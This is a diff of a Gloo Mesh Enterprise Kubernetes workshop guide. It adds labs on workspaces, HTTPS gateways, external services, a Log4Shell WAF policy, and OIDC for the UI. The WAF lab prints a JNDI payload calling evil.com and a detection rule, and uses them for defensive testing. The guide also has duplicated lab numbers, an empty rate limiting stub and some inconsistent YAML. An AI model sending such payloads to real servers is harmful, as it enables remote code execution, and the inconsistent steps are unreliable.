@@ -23,7 +23,10 @@ source ./scripts/assert.sh
 * [Lab 8a - Expose the productpage through a gateway](#Lab-8a)
 * [Lab 8b - Canary deployment with traffic shifting](#Lab-8b)
 * [Lab 9 - Traffic policies](#Lab-9)
-* [Lab 15 - Exploring the Gloo Mesh Enterprise UI](#Lab-15)
+* [Lab 10 - Expose an external service](#Lab-10)
+* [Lab 11 - Exploring the Gloo Mesh Enterprise UI](#Lab-11)
+* [Lab 12 - Exposing the Gloo Mesh UI](#Lab-12)
+* [Lab 13 - Integrate Gloo Mesh UI with OIDC](#Lab-13)
 
 ## Introduction to Gloo Mesh <a name="introduction"></a>
 
@@ -322,9 +325,65 @@ Note that we deployed the `productpage` service in the `bookinfo-frontends` name
 
 And we deployed the `v1` and `v2` versions of the `reviews` microservice, not the `v3` version.
 
-## Lab 4 - Deploy the httpbin demo app <a name="Lab-4"></a>
+## Lab 4 - Deploy the httpbin workspace and demo app <a name="Lab-4"></a>
 
-We're going to deploy the httpbin application to demonstrate several features of Istio and Gloo Mesh.
+We're going to create a workspace for the team in charge of the httpbin application.
+
+The platform team needs to create the corresponding `Workspace` Kubernetes objects in the Gloo Mesh management cluster.
+
+Let's create the `httpbin` workspace which corresponds to the `httpbin` namespace on `mgmt`:
+
+```bash
+kubectl apply --context ${MGMT} -f- <<EOF
+apiVersion: admin.gloo.solo.io/v2
+kind: Workspace
+metadata:
+  name: httpbin
+  namespace: gloo-mesh
+  labels:
+    allow_ingress: "true"
+spec:
+  workloadClusters:
+  - name: mgmt
+    namespaces:
+    - name: httpbin
+EOF
+```
+
+Then, the Httpbin team creates a `WorkspaceSettings` Kubernetes object in one of the namespaces of the `httpbin` workspace:
+
+```bash
+kubectl apply --context ${MGMT} -f- <<EOF
+apiVersion: admin.gloo.solo.io/v2
+kind: WorkspaceSettings
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  importFrom:
+  - workspaces:
+    - name: gateways
+    resources:
+    - kind: SERVICE
+  exportTo:
+  - workspaces:
+    - name: gateways
+    resources:
+    - kind: SERVICE
+      labels:
+        app: in-mesh
+    - kind: ALL
+      labels:
+        expose: "true"
+EOF
+```
+
+The Httpbin team has decided to export the following to the `gateway` workspace (using a reference):
+- the `in-mesh` Kubernetes service
+- all the resources (RouteTables, VirtualDestination, ...) that have the label `expose` set to `true`
+
+
+Now we're going to deploy the httpbin application to demonstrate several features of Istio and Gloo Mesh.
 
 You can find more information about this application [here](http://httpbin.org/).
 
@@ -450,7 +509,7 @@ not-in-mesh-5c64bb49cd-m9kwm   1/1     Running   0          11s
 First of all, let's install the `meshctl` CLI:
 
 ```bash
-export GLOO_MESH_VERSION=v2.0.9
+export GLOO_MESH_VERSION=v2.0.8
 curl -sL https://run.solo.io/meshctl/install | sh -
 export PATH=$HOME/.gloo-mesh/bin:$PATH
 ```
@@ -463,7 +522,7 @@ helm repo update
 kubectl --context ${MGMT} create ns gloo-mesh 
 helm upgrade --install gloo-mesh-enterprise gloo-mesh-enterprise/gloo-mesh-enterprise \
 --namespace gloo-mesh --kube-context ${MGMT} \
---version=2.0.9 \
+--version=2.0.8 \
 --values - <<EOF
 licenseKey: "${GLOO_MESH_LICENSE_KEY}"
 mgmtClusterName: mgmt
@@ -561,16 +620,6 @@ spec:
   clusterDomain: cluster.local
 EOF
 
-kubectl --context ${MGMT} create ns gloo-mesh
-
-kubectl get secret relay-root-tls-secret -n gloo-mesh --context ${MGMT} -o jsonpath='{.data.ca\.crt}' | base64 -d > ca.crt
-kubectl create secret generic relay-root-tls-secret -n gloo-mesh --context ${MGMT} --from-file ca.crt=ca.crt
-rm ca.crt
-
-kubectl get secret relay-identity-token-secret -n gloo-mesh --context ${MGMT} -o jsonpath='{.data.token}' | base64 -d > token
-kubectl create secret generic relay-identity-token-secret -n gloo-mesh --context ${MGMT} --from-file token=token
-rm token
-
 helm upgrade --install gloo-mesh-agent gloo-mesh-agent/gloo-mesh-agent \
   --namespace gloo-mesh \
   --kube-context=${MGMT} \
@@ -579,7 +628,7 @@ helm upgrade --install gloo-mesh-agent gloo-mesh-agent/gloo-mesh-agent \
   --set rate-limiter.enabled=false \
   --set ext-auth-service.enabled=false \
   --set cluster=mgmt \
-  --version 2.0.9
+  --version 2.0.8
 ```
 
 Note that the registration can also be performed using `meshctl cluster register`.
@@ -618,7 +667,7 @@ helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
   --set glooMeshAgent.enabled=false \
   --set rate-limiter.enabled=true \
   --set ext-auth-service.enabled=true \
-  --version 2.0.9
+  --version 2.0.8
 ```
 
 Finally, you need to specify which gateways you want to use for cross cluster traffic:
@@ -781,7 +830,7 @@ kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: VirtualGateway
 metadata:
-  name: north-south-gw
+  name: north-south-gw-80
   namespace: istio-gateways
 spec:
   workloads:
@@ -813,7 +862,7 @@ spec:
   hosts:
     - '*'
   virtualGateways:
-    - name: north-south-gw
+    - name: north-south-gw-80
       namespace: istio-gateways
       cluster: mgmt
   workloadSelectors: []
@@ -864,20 +913,16 @@ Then, you have to store them in a Kubernetes secrets running the following comma
 kubectl --context ${MGMT} -n istio-gateways create secret generic tls-secret \
 --from-file=tls.key=tls.key \
 --from-file=tls.crt=tls.crt
-
-kubectl --context ${CLUSTER2} -n istio-gateways create secret generic tls-secret \
---from-file=tls.key=tls.key \
---from-file=tls.crt=tls.crt
 ```
 
-Finally, the Gateway team needs to update the `VirtualGateway` to use this secret:
+Now the Gateway team needs to create a new `VirtualGateway` that uses this secret:
 
 ```bash
 kubectl --context ${MGMT} apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: VirtualGateway
 metadata:
-  name: north-south-gw
+  name: north-south-gw-443
   namespace: istio-gateways
 spec:
   workloads:
@@ -896,6 +941,48 @@ spec:
 # -------------------------------------------------------
       allowedRouteTables:
         - host: '*'
+EOF
+```
+
+Now we can update the `RouteTable` to use the new gateway created on port 443
+
+```bash
+kubectl --context ${MGMT} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: productpage
+  namespace: bookinfo-frontends
+  labels:
+    expose: "true"
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw-443
+      namespace: istio-gateways
+      cluster: mgmt
+  workloadSelectors: []
+  http:
+    - name: productpage
+      matchers:
+      - uri:
+          exact: /productpage
+      - uri:
+          prefix: /static
+      - uri:
+          exact: /login
+      - uri:
+          exact: /logout
+      - uri:
+          prefix: /api/v1/products
+      forwardTo:
+        destinations:
+          - ref:
+              name: productpage
+              namespace: bookinfo-frontends
+            port:
+              number: 9080
 EOF
 ```
 
@@ -1197,9 +1284,304 @@ kubectl --context ${MGMT} -n bookinfo-backends delete faultinjectionpolicy ratin
 kubectl --context ${MGMT} -n bookinfo-backends delete routetable ratings
 kubectl --context ${MGMT} -n bookinfo-backends delete retrytimeoutpolicy reviews-request-timeout
 kubectl --context ${MGMT} -n bookinfo-backends delete routetable reviews
+kubectl --context ${MGMT} -n bookinfo-frontends delete routetable productpage
 ```
 
-## Lab 15 - Exploring the Gloo Mesh Enterprise UI <a name="Lab-15"></a>
+## Lab 10 - Expose an external service <a name="Lab-10"></a>
+
+In this step, we're going to expose an external service through a Gateway using Gloo Mesh and show how we can then migrate this service to the Mesh.
+
+Let's create an `ExternalService` corresponding to `httpbin.org`:
+
+```bash
+kubectl --context ${MGMT} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: ExternalService
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    expose: "true"
+spec:
+  hosts:
+  - httpbin.org
+  ports:
+  - name: http
+    number: 80
+    protocol: HTTP
+  - name: https
+    number: 443
+    protocol: HTTPS
+    clientsideTls: {}
+EOF
+```
+
+Now, you can create a `RouteTable` to expose `httpbin.org` through the gateway:
+
+```bash
+kubectl --context ${MGMT} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    expose: "true"
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw-443
+      namespace: istio-gateways
+      cluster: mgmt
+  workloadSelectors: []
+  http:
+    - name: httpbin
+      matchers:
+      - uri:
+          exact: /get
+      forwardTo:
+        destinations:
+        - kind: EXTERNAL_SERVICE
+          port:
+            number: 443
+          ref:
+            name: httpbin
+            namespace: httpbin
+EOF
+```
+
+You should now be able to access `httpbin.org` external service through the gateway.
+
+Get the URL to access the `httpbin` service using the following command:
+```
+echo "https://${ENDPOINT_HTTPS_GW_MGMT}/get"
+```
+
+Let's update the `RouteTable` to direct 50% of the traffic to the local `httpbin` service:
+
+```bash
+kubectl --context ${MGMT} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    expose: "true"
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw-443
+      namespace: istio-gateways
+      cluster: mgmt
+  workloadSelectors: []
+  http:
+    - name: httpbin
+      matchers:
+      - uri:
+          exact: /get
+      forwardTo:
+        destinations:
+        - kind: EXTERNAL_SERVICE
+          port:
+            number: 443
+          ref:
+            name: httpbin
+            namespace: httpbin
+          weight: 50
+        - ref:
+            name: in-mesh
+            namespace: httpbin
+          port:
+            number: 8000
+          weight: 50
+EOF
+```
+
+If you refresh your browser, you should see that you get a response either from the local service or from the external service.
+
+When the response comes from the external service (httpbin.org), there's a `X-Amzn-Trace-Id` header.
+
+And when the response comes from the local service, there's a `X-B3-Parentspanid` header.
+
+Finally, you can update the `RouteTable` to direct all the traffic to the local `httpbin` service:
+
+```bash
+kubectl --context ${MGMT} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    expose: "true"
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw-443
+      namespace: istio-gateways
+      cluster: mgmt
+  workloadSelectors: []
+  http:
+    - name: httpbin
+      matchers:
+      - uri:
+          exact: /get
+      forwardTo:
+        destinations:
+        - ref:
+            name: in-mesh
+            namespace: httpbin
+          port:
+            number: 8000
+EOF
+```
+
+If you refresh your browser, you should see that you get responses only from the local service.
+
+This diagram shows the flow of the requests :
+
+![Gloo Mesh Gateway EXternal Service](images/steps/gateway-external-service/gloo-mesh-gateway-external-service.svg)
+
+## Lab 11 - Implement Rate Limiting policy on httpbin <a name="Lab-11"></a>
+In this lab, lets explore adding rate limiting to our httpbin route
+
+## Lab 12 - Use the Web Application Firewall filter <a name="Lab-12"></a>
+A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.
+
+Gloo Mesh includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections. 
+
+An example of how using Gloo Mesh we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.
+
+The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit. 
+
+Using the Web Application Firewall capabilities you can reject requests containing such headers. 
+
+Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That’s what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
+
+Create the WAF policy:
+
+```bash
+kubectl --context ${MGMT} apply -f - <<'EOF'
+apiVersion: security.policy.gloo.solo.io/v2
+kind: WAFPolicy
+metadata:
+  name: log4shell
+  namespace: httpbin
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        waf: "true"
+  config:
+    disableCoreRuleSet: true
+    customInterventionMessage: 'Log4Shell malicious payload'
+    customRuleSets:
+    - ruleStr: |
+        SecRuleEngine On
+        SecRequestBodyAccess On
+        SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
+          "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://" 
+          "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
+EOF
+```
+
+Finally, you need to update the httpbin `RouteTable` to use this `AuthConfig`:
+
+```bash
+kubectl --context ${MGMT} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    expose: "true"
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw-443
+      namespace: istio-gateways
+      cluster: mgmt
+  workloadSelectors: []
+  http:
+    - name: httpbin
+      labels:
+        waf: "true"
+      matchers:
+      - uri:
+          exact: /get
+      forwardTo:
+        destinations:
+        - ref:
+            name: in-mesh
+            namespace: httpbin
+          port:
+            number: 8000
+EOF
+```
+
+Run the following command to simulate an attack:
+
+```bash
+curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k https://${ENDPOINT_HTTPS_GW_MGMT}/get -i
+```
+
+The request should be rejected:
+```
+HTTP/2 403 
+content-length: 27
+content-type: text/plain
+date: Tue, 05 Apr 2022 10:20:06 GMT
+server: istio-envoy
+
+Log4Shell malicious payload
+```
+
+### cleanup
+Let's apply the original `RouteTable` yaml:
+```bash
+kubectl --context ${MGMT} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    expose: "true"
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw-443
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
+  http:
+    - name: httpbin
+      matchers:
+      - uri:
+          exact: /get
+      forwardTo:
+        destinations:
+        - ref:
+            name: in-mesh
+            namespace: httpbin
+          port:
+            number: 8000
+EOF
+```
+
+And also delete the waf policy we've created:
+```bash
+kubectl --context ${MGMT} -n httpbin delete wafpolicies.security.policy.gloo.solo.io log4shell
+```
+
+## Lab 11 - Exploring the Gloo Mesh Enterprise UI <a name="Lab-11"></a>
 
 Gloo Mesh provides a powerful dashboard to view your multi-cluster Istio environment.
 
@@ -1213,3 +1595,288 @@ kubectl port-forward -n gloo-mesh svc/gloo-mesh-ui 8090 --context ${MGMT}
 The UI is available at http://localhost:8090
 
 ![Gloo Mesh Dashboard](images/gm-dashboard.png)
+
+## Lab 12 - Exposing the Gloo Mesh UI <a name="Lab-12"></a>
+First we are going to create a new workspace that we will name the Admin Workspace. In this workspace we will put management tools such as the gloo-mesh namespace (or in future tools like argocd, for example)
+```
+kubectl apply --context ${MGMT} -f- <<EOF
+apiVersion: admin.gloo.solo.io/v2
+kind: Workspace
+metadata:
+  labels:
+    allow_ingress: "true"
+  name: admin-workspace
+  namespace: gloo-mesh
+spec:
+  workloadClusters:
+  - name: mgmt
+    namespaces:
+    - name: gloo-mesh
+---
+apiVersion: admin.gloo.solo.io/v2
+kind: WorkspaceSettings
+metadata:
+  name: admin-workspace-settings
+  namespace: gloo-mesh
+spec:
+  exportTo:
+  - resources:
+    - kind: ALL
+      labels:
+        expose: "true"
+    - kind: SERVICE
+      labels:
+        app: gloo-mesh-ui
+    workspaces:
+    workspaces:
+    - name: gateways
+  importFrom:
+  - resources:
+    - kind: SERVICE
+    workspaces:
+    - name: gateways
+  options:
+    federation:
+      enabled: true
+      hostSuffix: global
+EOF
+```
+
+### Update Gloo Mesh Helm 
+
+Save this as a values.yaml, keep the commented out sections as we may use those later
+```
+licenseKey: <INSERT_LICENSE_KEY_HERE>
+mgmtClusterName: mgmt
+glooMeshMgmtServer:
+  ports:
+    healthcheck: 8091
+  serviceType: LoadBalancer
+glooMeshUi:
+  enabled: true
+  serviceType: ClusterIP
+  #auth:
+  #  enabled: true
+  #  backend: oidc
+  #  oidc: 
+  #    # From the OIDC provider
+  #    clientId: "<client_id>"
+  #    # From the OIDC provider. To be base64 encoded and stored as a kubernetes secret.
+  #    clientSecret: "<client_secret>"
+  #    # Name for generated secret
+  #    clientSecretName: dashboard
+  #    # The issuer URL from the OIDC provider, usually something like 'https://<domain>.<provider_url>/'.
+  #    issuerUrl: <issuer_url>
+  #    # The URL that the UI for the OIDC app is available at, from the DNS and other ingress settings that expose the OIDC app UI service.
+  #    appUrl: "<app_url>"
+  #
+  # if cluster is istio enabled we can also add the dashboard into the mesh
+  deploymentOverrides:
+    spec:
+      template:
+        metadata:
+          annotations:
+            sidecar.istio.io/inject: "true"
+          labels:
+            istio.io/rev: "1-13"
+```
+
+Now upgrade Gloo Mesh
+```
+helm --kube-context ${MGMT} upgrade --install gloo-mesh-enterprise gloo-mesh-enterprise/gloo-mesh-enterprise -n gloo-mesh --version=2.0.8 --values=values.yaml
+```
+
+Now that we have injected the gloo-mesh-ui with a sidecar, we should be able to see this reflected as `4/4` READY pods. If not just delete the pod so it re-deploys with one
+```
+% k get pods -n gloo-mesh
+NAME                                     READY   STATUS    RESTARTS      AGE
+gloo-mesh-redis-5d694bdc9-8cqx8          1/1     Running   0             60m
+gloo-mesh-mgmt-server-6c66ddd7c8-jjddg   1/1     Running   0             60m
+prometheus-server-59946649d9-2gcgx       2/2     Running   0             60m
+gloo-mesh-agent-598bc58db9-7xbjv         1/1     Running   1 (58m ago)   59m
+gloo-mesh-ui-54c67b5bc6-bwv5n            4/4     Running   1 (56m ago)   56m
+```
+
+### Create our Virtual Destination and Route Table
+```
+kubectl apply --context ${MGMT} -f- <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  labels:
+    expose: "true"
+  name: gm-ui-rt
+  namespace: gloo-mesh
+spec:
+  hosts:
+  - '*'
+  http:
+  - forwardTo:
+      destinations:
+      - kind: VIRTUAL_DESTINATION
+        port:
+          number: 8090
+        ref:
+          cluster: mgmt
+          name: gm-ui-vd
+          namespace: gloo-mesh
+    name: gloo-mesh-ui
+    matchers:
+    - uri:
+        prefix: /
+    - uri:
+        prefix: /graph
+    - uri:
+        prefix: /gateways
+    - uri:
+        prefix: /policies
+    - uri:
+        prefix: /oidc-callback
+    - uri:
+        prefix: /logout
+  virtualGateways:
+  - cluster: mgmt
+    name: north-south-gw-80
+    namespace: istio-gateways
+  workloadSelectors: []
+---
+apiVersion: networking.gloo.solo.io/v2
+kind: VirtualDestination
+metadata:
+  labels:
+    expose: "true"
+  name: gm-ui-vd
+  namespace: gloo-mesh
+spec:
+  hosts:
+  - gm-ui.mgmt.global
+  ports:
+  - number: 8090
+    protocol: HTTP
+  services:
+  - cluster: mgmt
+    labels:
+      app: gloo-mesh-ui
+    namespace: gloo-mesh
+EOF
+```
+
+Alternatively you can also apply the `RouteTable` to the gateway on 443 instead
+```
+kubectl apply --context ${MGMT} -f- <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  labels:
+    expose: "true"
+  name: gm-ui-rt
+  namespace: gloo-mesh
+spec:
+  hosts:
+  - '*'
+  http:
+  - forwardTo:
+      destinations:
+      - kind: VIRTUAL_DESTINATION
+        port:
+          number: 8090
+        ref:
+          cluster: mgmt
+          name: gm-ui-vd
+          namespace: gloo-mesh
+    name: gloo-mesh-ui
+    matchers:
+    - uri:
+        prefix: /
+    - uri:
+        prefix: /graph
+    - uri:
+        prefix: /gateways
+    - uri:
+        prefix: /policies
+    - uri:
+        prefix: /oidc-callback
+    - uri:
+        prefix: /logout
+  virtualGateways:
+  - cluster: mgmt
+    name: north-south-gw-443
+    namespace: istio-gateways
+  workloadSelectors: []
+EOF
+```
+
+Now you should be able to access the Gloo Mesh UI on port 443
+```
+echo "https://${ENDPOINT_HTTPS_GW_MGMT}"
+```
+
+## Lab 13 - Integrate Gloo Mesh UI with OIDC <a name="Lab-13"></a>
+Now that we have our Gloo Mesh UI exposed, we can integrate it with our OIDC. The Gloo Mesh API server has its own external auth service built in. This way, you can manage external auth for the Gloo Mesh UI separately from the external auth that you set up for your application networking policies.
+
+The `gloo-mesh-enterprise` helm chart lets us define the OIDC values inline. The values OIDC values are described below:
+```
+glooMeshUi:
+  enabled: true
+  auth:
+    enabled: true
+    backend: oidc
+    oidc:
+      clientId: # From the OIDC provider
+      clientSecret: # From the OIDC provider. Stored in a secret that you created in advance in the same namespace as the Gloo Mesh UI. In this example, the secret's name is 'dashboard'.
+      clientSecretName: dashboard
+      issuerUrl: # The URL to connect to the OpenID Connect identity provider, often in the format 'https://<domain>.<provider_url>/'.
+      appUrl: # The URL that the Gloo Mesh UI is exposed at, such as 'https://localhost:8090'.
+```
+
+### Update Gloo Mesh Helm 
+
+Edit your existing `values.yaml` to fill in the auth config that we have uncommented below
+```
+licenseKey: <INSERT_LICENSE_KEY_HERE>
+mgmtClusterName: mgmt
+glooMeshMgmtServer:
+  ports:
+    healthcheck: 8091
+  serviceType: LoadBalancer
+glooMeshUi:
+  enabled: true
+  serviceType: ClusterIP
+  auth:
+    enabled: true
+    backend: oidc
+    oidc: 
+      # From the OIDC provider
+      clientId: "<client_id>"
+      # From the OIDC provider. To be base64 encoded and stored as a kubernetes secret.
+      clientSecret: "<client_secret>"
+      # Name for generated secret
+      clientSecretName: dashboard
+      # The issuer URL from the OIDC provider, usually something like 'https://<domain>.<provider_url>/'.
+      issuerUrl: <issuer_url>
+      # The URL that the UI for the OIDC app is available at, from the DNS and other ingress settings that expose the OIDC app UI service.
+      appUrl: "<app_url>"
+  # if cluster is istio enabled we can also add the dashboard into the mesh
+  deploymentOverrides:
+    spec:
+      template:
+        metadata:
+          annotations:
+            sidecar.istio.io/inject: "true"
+          labels:
+            istio.io/rev: "1-13"
+```
+
+Now upgrade Gloo Mesh
+```
+helm --kube-context ${MGMT} upgrade --install gloo-mesh-enterprise gloo-mesh-enterprise/gloo-mesh-enterprise -n gloo-mesh --version=2.0.8 --values=values.yaml
+```
+
+To access the Gloo Mesh UI protected by OIDC we must properly configure DNS to map to the `<app_url>` defined above to our gateway IP (i.e. https://gmui.glootest.com). One method is to modify your `/etc/hosts` file locally
+```
+# mgmt
+<GATEWAY_IP> gmui.glootest.com
+```
+
+Once configured, you should be able to access the Gloo Mesh UI at https://gmui.glootest.com and it should be now be protected by OIDC.
+
